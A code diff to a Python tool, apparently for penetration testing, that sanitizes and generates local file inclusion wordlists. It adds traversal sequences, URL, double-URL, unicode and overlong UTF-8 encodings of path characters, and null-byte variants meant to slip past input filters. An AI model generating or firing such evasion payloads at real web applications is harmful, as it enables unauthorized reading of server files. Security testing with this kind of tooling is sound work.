@@ -54,11 +54,11 @@ def sanitize(config_obj: object):
     features the same but also ensures the payload is lowercase and is able to parse in or remove
     system drive letters.
 
-    :param config_obj:  The program configuration instance.
     :return:  Nothing
     """
     filter_dict = {}
 
+    print(f'[+] Sanitizing the input wordlist {config_obj.in_file.name} ..\n')
     try:
         # Open the input wordlist in read mode and output wordlist in append mode #
         with config_obj.in_file.open('rb') as in_file, config_obj.out_file.open('wb') as out_file:
@@ -85,9 +85,6 @@ def sanitize(config_obj: object):
                 # Hash the contents of parse line in buffer as SHA256 #
                 line_hash = hashlib.sha256(line_buffer).hexdigest()
 
-                print(f'[+] Payload: {line_buffer.decode(errors="replace"):100s}  '
-                      f'Hash: {line_hash}')
-
                 # If the payload hash is not a key in dict (payload has not been added) #
                 if line_hash not in filter_dict:
                     # Assign sanitized payload of current iteration to hash table by hash index #
@@ -102,12 +99,16 @@ def sanitize(config_obj: object):
         logging.error('Error occurred during file operation: %s', file_err)
         sys.exit(3)
 
+    print(f'[!] LFI {config_obj.os} wordlist sanitization complete .. '
+          f'stored at:\n\n\t\t- {config_obj.out_file}\n')
 
-def null_gen(payload_list: list) -> list:
+
+def null_gen(config_obj: object, payload_list: list) -> list:
     """
     Generates null byte injection mutations of the original payload passed and populates generated
     payloads to the payload list.
 
+    :param config_obj:  The program configuration instance.
     :param payload_list:  The payload list for storing mutations per iterations via wordlist.
     :return:  The updated mutation payload list.
     """
@@ -115,62 +116,66 @@ def null_gen(payload_list: list) -> list:
 
     # Iterate through the list of already existing payloads #
     for payload in payload_list:
-        # Append null byte on the end of current payload #
-        payload_buffer = payload + b'%00'
-        # Add the payload to the mutations list #
-        mutations.append(payload_buffer)
-        # Reset line buffer with null byte prepended on the front of the payload #
-        payload_buffer = b'%00' + payload
-        # Add the payload to the mutations list #
-        mutations.append(payload_buffer)
+        # If the null byte generation mode is appended or both #
+        if config_obj.null_byte in ('a', 'b'):
+            # Append null byte on the end of current payload #
+            payload_buffer = payload + b'%00'
+            # Add the payload to the mutations list #
+            mutations.append(payload_buffer)
+
+        # If th4e null byte gener
+        if config_obj.null_byte in ('p', 'b'):
+            # Reset line buffer with null byte prepended on the front of the payload #
+            payload_buffer = b'%00' + payload
+            # Add the payload to the mutations list #
+            mutations.append(payload_buffer)
 
     return payload_list + mutations
 
 
-def encoded_gen(config_obj: object, line_buffer: bytes, line: bytes, payload_list: list) -> list:
+def encoded_gen(config_obj: object, payload_list: list) -> list:
     """
     Generates encoded payload mutations of the original payload passed and populates generated
     payloads to the payload list.
 
     :param config_obj:  The program configuration instance.
-    :param line_buffer:  The line buffer for storing the parsed original payload.
-    :param line:  The original payload file path read from input wordlist.
     :param payload_list:  The payload list for storing mutations per iteration via wordlist.
     :return:  The populated mutation payload list.
     """
-    # Iterate through the path char replace encodings #
-    for slash_char, period_char, colon_char in zip(config_obj.path_chars, config_obj.period_chars,
-                                                   config_obj.colon_chars):
-        # If the wordlist mode is windows #
-        if config_obj.os == 'windows':
-            # If there is a slash char to parse in current iteration #
-            if slash_char:
-                # Replace backslash with current parsing character #
-                line_buffer = line_buffer.replace(b'\\', slash_char)
+    mutations = []
 
-            # If there is colon char to parse in current iteration #
-            if colon_char:
+    # Iterate through the existing payload list #
+    for payload in payload_list:
+        # Iterate through the path char mutation encodings #
+        for (slash_char, backslash_char,
+             period_char, colon_char) in zip(config_obj.slash_chars, config_obj.backslash_chars,
+                                             config_obj.period_chars, config_obj.colon_chars):
+            # Set the line buffer to the current payload #
+            line_buffer = payload
+            # If there is a slash mutation to be parsed and a slash in line #
+            if slash_char and b'/' in line_buffer:
+                # Replace the original slash with mutation #
+                line_buffer = line_buffer.replace(b'/', slash_char)
+
+            # If there is a backslash mutation to be parsed and a slash in line #
+            if backslash_char and b'\\' in line_buffer:
+                # Replace the original backslash with mutation #
+                line_buffer = line_buffer.replace(b'\\', backslash_char)
+
+            # If there is a period mutation to be parsed and a period in line # #
+            if period_char and b'.' in line_buffer:
+                # Replace the period encoding for current iteration #
+                line_buffer = line_buffer.replace(b'.', period_char)
+
+            # If mode is windows and there is a mutation to be parsed and line has a colon #
+            if config_obj.os == 'windows' and colon_char and b':' in line_buffer:
                 # Replace colon character with current parsing character #
                 line_buffer = line_buffer.replace(b':', colon_char)
 
-        # If the wordlist mode is mac or linux #
-        else:
-            # If there is a slash char to parse in current iteration #
-            if slash_char:
-                # Replace slash with current parsing character #
-                line_buffer = line_buffer.replace(b'/', slash_char)
+            # Add encoding mutation payload to payload list #
+            mutations.append(line_buffer)
 
-        # If there is a period character encoding to parse #
-        if period_char:
-            # Replace the period encoding for current iteration #
-            line_buffer = line_buffer.replace(b'.', period_char)
-
-        # Add encoding mutation payload to payload list #
-        payload_list.append(line_buffer)
-        # Reset line buffer to original line #
-        line_buffer = line
-
-    return payload_list
+    return payload_list + mutations
 
 
 def traversal_gen(config_obj: object, payload_list: list) -> list:
@@ -217,15 +222,14 @@ def generate(config_obj: object):
     """
     payload_list = []
 
+    print(f'[+] Generating {config_obj.os} mutation wordlist from {config_obj.in_file.name}\n')
     try:
         # Open the input wordlist in read mode and output wordlist in append mode #
         with config_obj.in_file.open('rb') as in_file, config_obj.out_file.open('wb') as out_file:
             # Iterate through input wordlist line by line #
             for line in in_file:
-                # Copy original line into buffer #
-                line_buffer = line.strip()
                 # Add original file path payload to list #
-                payload_list.append(line_buffer)
+                payload_list.append(line.strip())
 
                 # If there are directory traversal mutations to generate #
                 if config_obj.traversal_start and config_obj.traversal_end:
@@ -233,22 +237,19 @@ def generate(config_obj: object):
                     payload_list = traversal_gen(config_obj, payload_list)
 
                 # If there are encoding mutations to generate #
-                if config_obj.path_chars:
+                if config_obj.slash_chars:
                     # Generate specified encoded mutations #
-                    payload_list = encoded_gen(config_obj, line_buffer, line.strip(), payload_list)
+                    payload_list = encoded_gen(config_obj, payload_list)
 
                 # If there are null byte mutations to generate #
                 if config_obj.null_byte:
                     # Generate null byte injection mutations #
-                    payload_list = null_gen(payload_list)
+                    payload_list = null_gen(config_obj, payload_list)
 
                 # Iterate through generated payload list and write to output file #
                 [out_file.write(payload + b'\n') for payload in payload_list]
                 # Reset the payload list per iteration #
                 payload_list = []
-
-                # TODO:  delete after single iteration perfected
-                sys.exit(0)
 
     # If error occurs during file operation #
     except OSError as file_err:
@@ -256,6 +257,9 @@ def generate(config_obj: object):
         print_err(f'Error occurred during file operation: {file_err}')
         logging.error('Error occurred during file operation: %s', file_err)
         sys.exit(3)
+
+    print(f'[!] LFI {config_obj.os} wordlist generation complete .. '
+          f'stored at:\n\n\t\t- {config_obj.out_file}\n')
 
 
 def main(config_obj: object):
@@ -265,6 +269,8 @@ def main(config_obj: object):
     :param config_obj:  The program configuration instance.
     :return:  Nothing
     """
+    # TODO: add super sweet program banner with some sort of computer spatula
+
     # If the program mode is wordlist generation #
     if config_obj.mode == 'generate':
         # Call the wordlist generation function #
@@ -296,7 +302,8 @@ class ProgramConfig:
         self.out_file = None
         self.mode = None
         self.os = None
-        self.path_chars = []
+        self.slash_chars = []
+        self.backslash_chars = []
         self.period_chars = []
         self.colon_chars = []
         self.traversal_chars = []
@@ -430,76 +437,56 @@ class ProgramConfig:
         :param encoding_input:  The parsed encoding string specified by user.
         :return:  Nothing
         """
-        url = False
-        double_url = False
-        bit_unicode = False
-        overlong_encoding = False
-
-        # Iterate through the parsed input encoding specifier string #
-        for char in encoding_input:
-            # If character specifies url encoding #
-            if char == 'u':
-                url = True
-            # If character specifies double url encoding #
-            if char == 'd':
-                double_url = True
-            # If character specifies 16-bit unicode #
-            if char == 'b':
-                bit_unicode = True
-            # If character specifies overlong utf-8 encoding #
-            if char == 'o':
-                overlong_encoding = True
-
         # If url encoding was specified #
-        if url:
+        if 'u' in encoding_input:
             # If the specified os is windows #
             if conf_obj.os == 'windows':
-                self.path_chars.append(b'%5c')
                 self.colon_chars.append(b'%3a')
             # If the specified os is linux/mac #
             else:
-                self.path_chars.append(b'%2f')
                 self.colon_chars.append(None)
 
+            self.slash_chars.append(b'%2f')
+            self.backslash_chars.append(b'%5c')
             self.period_chars.append(b'%2e')
 
         # If double url encoding was specified #
-        if double_url:
+        if 'd' in encoding_input:
             # If the specified os is windows #
             if conf_obj.os == 'windows':
-                self.path_chars.append(b'%255c')
                 self.colon_chars.append(b'%253a')
             # If the specified os if linux/mac #
             else:
-                self.path_chars.append(b'%252f')
                 self.colon_chars.append(None)
 
+            self.slash_chars.append(b'%252f')
+            self.backslash_chars.append(b'%255c')
             self.period_chars.append(b'%252e')
 
         # If 16-bit unicode was specified #
-        if bit_unicode:
+        if 'b' in encoding_input:
             # If the specified os is windows #
             if conf_obj.os == 'windows':
-                self.path_chars += [b'%u005c', b'%u2216']
                 self.colon_chars += [b'%u003a', b'%u003a']
             # If the specified os if linux/mac #
             else:
-                self.path_chars += [b'%u002f', b'%u2215']
                 self.colon_chars += [None, None]
 
+            self.slash_chars += [b'%u002f', b'%u2215']
+            self.backslash_chars += [b'%u005c', b'%u2216']
             self.period_chars += [b'%u002e', b'%u002e']
 
         # If overlong utf-8 encoding was specified #
-        if overlong_encoding:
+        if 'o' in encoding_input:
             # If the specified os is windows #
             if conf_obj.os == 'windows':
-                self.path_chars += [b'%c0%5c', b'%c0%80%5c', b'%c0%5c']
                 self.colon_chars += [b'%c0%3a', b'%e0%80%3a', b'%c0%3a']
             # If the specified os if linux/mac #
             else:
-                self.path_chars += [b'%c0%af', b'%e0%80%af', b'%c0%2f']
                 self.colon_chars += [None, None, None]
 
+            self.slash_chars += [b'%c0%af', b'%e0%80%af', b'%c0%2f']
+            self.backslash_chars += [b'%c0%5c', b'%c0%80%5c', b'%c0%5c']
             self.period_chars += [b'%c0%2e', b'%e0%40%ae', b'%c0%ae']
 
     def validate_drive(self, drive_letter: str):
@@ -550,9 +537,9 @@ if __name__ == '__main__':
                                                       'in a comma-separated with a colon delimiter '
                                                       'between traversal and slash format list like'
                                                       ' ../:/, ....//://, ..\\:\\, etc')
-    arg_parser.add_argument('--null_byte', default=False, type=bool,
-                            help='Boolean toggle to generate null byte payloads based on generated '
-                                 'encoding & traversal mutations')
+    arg_parser.add_argument('--null_byte', help='Generate null byte payloads based on generated '
+                                                'encoding & traversal mutations. Features 3 modes: '
+                                                'p (prepend), a (append), b (both)')
     arg_parser.add_argument('--out_file', help='The path where the output file is written or '
                                                'name of file if in same directory')
     arg_parser.add_argument('--drive', help='The Windows drive associated with sanitization mode. '
@@ -600,8 +587,10 @@ if __name__ == '__main__':
 
     # If null byte mutations were specified #
     if parsed_args.null_byte:
-        # Set null byte mutation mode to on #
-        conf_obj.null_byte = True
+        # If the null bytes mutation mode was properly specified #
+        if parsed_args.null_byte in ('p', 'a', 'b'):
+            # Set null byte mutation mode to on #
+            conf_obj.null_byte = parsed_args.null_byte
 
     # If an output file was specified #
     if parsed_args.out_file:
